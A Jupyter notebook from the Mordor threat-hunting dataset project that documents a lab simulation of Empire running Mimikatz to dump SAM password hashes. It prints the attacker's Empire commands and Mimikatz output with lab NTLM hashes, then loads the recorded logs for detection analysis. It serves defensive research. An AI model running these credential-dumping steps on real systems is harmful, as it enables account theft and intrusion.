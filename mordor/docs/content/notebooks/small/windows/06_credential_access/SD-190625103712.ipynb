{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire Mimikatz Lsadump SAM"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| id                | SD-190625103712 |\n",
    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date     | 2019/06/25 |\n",
    "| platform          | Windows |\n",
    "| Mordor Environment| shire |\n",
    "| Simulation Type   | C2 |\n",
    "| Simulation Tool   | Empire |\n",
    "| Simulation Script | https://github.com/hunters-forge/Blacksmith/blob/master/aws/mordor/cfn-files/scripts/Invoke-Mimikatz.ps1 |\n",
    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_lsadump_sam.tar.gz |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries using PowerSploit's Invoke-Mimikatz function to extract hashes from the Security Account Managers (SAM) database"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: Y298VW3B) > usemodule credentials/mimikatz/sam*\n",
    "(Empire: powershell/credentials/mimikatz/sam) > info\n",
    "\n",
    "              Name: Invoke-Mimikatz SAM dump\n",
    "            Module: powershell/credentials/mimikatz/sam\n",
    "        NeedsAdmin: True\n",
    "         OpsecSafe: True\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: True\n",
    "   OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @JosephBialek\n",
    "  @gentilkiwi\n",
    "\n",
    "Description:\n",
    "  Runs PowerSploit's Invoke-Mimikatz function to extract\n",
    "  hashes from the Security Account Managers (SAM) database.\n",
    "\n",
    "Comments:\n",
    "  http://clymb3r.wordpress.com/ http://blog.gentilkiwi.com htt\n",
    "  ps://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#ls\n",
    "  a\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name  Required    Value                     Description\n",
    "  ----  --------    -------                   -----------\n",
    "  Agent True        Y298VW3B                  Agent to run module on.                 \n",
    "\n",
    "(Empire: powershell/credentials/mimikatz/sam) > execute\n",
    "[*] Tasked Y298VW3B to run TASK_CMD_JOB\n",
    "[*] Agent Y298VW3B tasked with task ID 3\n",
    "[*] Tasked agent Y298VW3B to run module powershell/credentials/mimikatz/sam\n",
    "(Empire: powershell/credentials/mimikatz/sam) > Job started: DV6AHB\n",
    "Hostname: HR001.shire.com / S-1-5-21-2511471446-1103646877-3980648787\n",
    "\n",
    "  .#####.   mimikatz 2.1.1 (x64) #17763 Feb 23 2019 12:03:02\n",
    " .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo) ** Kitten Edition **\n",
    " ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n",
    " ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n",
    " '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n",
    "  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n",
    "\n",
    "mimikatz(powershell) # token::elevate\n",
    "Token Id  : 0\n",
    "User name : \n",
    "SID name  : NT AUTHORITY\\SYSTEM\n",
    "\n",
    "512\t{0;000003e7} 1 D 36238     \tNT AUTHORITY\\SYSTEM\tS-1-5-18\t(04g,21p)\tPrimary\n",
    " -> Impersonated !\n",
    " * Process Token : {0;000b8e62} 1 F 83841234  \tSHIRE\\nmartha\tS-1-5-21-2511471446-1103646877-3980648787-1106\t(12g,23p)\tPrimary\n",
    " * Thread Token  : {0;000003e7} 1 D 85913723  \tNT AUTHORITY\\SYSTEM\tS-1-5-18\t(04g,21p)\tImpersonation (Delegation)\n",
    "\n",
    "mimikatz(powershell) # lsadump::sam\n",
    "Domain : HR001\n",
    "SysKey : c7bc124448d3851819e68f8c2c199c2f\n",
    "Local SID : S-1-5-21-3594478387-3513325568-2589039918\n",
    "\n",
    "SAMKey : 8b66c564e175f6a7c0c40bc70f65144f\n",
    "\n",
    "RID  : 000001f4 (500)\n",
    "User : Administrator\n",
    "\n",
    "RID  : 000001f5 (501)\n",
    "User : Guest\n",
    "\n",
    "RID  : 000001f7 (503)\n",
    "User : DefaultAccount\n",
    "\n",
    "RID  : 000001f8 (504)\n",
    "User : WDAGUtilityAccount\n",
    "  Hash NTLM: 63a935cccb1d1be6c4011ec2a68f1a95\n",
    "\n",
    "RID  : 000003e9 (1001)\n",
    "User : Nora\n",
    "  Hash NTLM: f9558f5eff6314996c96ec2c3800d3f0\n",
    "\n",
    "mimikatz(powershell) # token::revert\n",
    " * Process Token : {0;000b8e62} 1 F 83841234  \tSHIRE\\nmartha\tS-1-5-21-2511471446-1103646877-3980648787-1106\t(12g,23p)\tPrimary\n",
    " * Thread Token  : no token\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_lsadump_sam.tar.gz\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT channel, COUNT(1)\n",
    "FROM mordorTable\n",
    "GROUP BY channel\n",
    "    '''\n",
    ")\n",
    "df.show(10,False)\n",
    "        "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 4
}
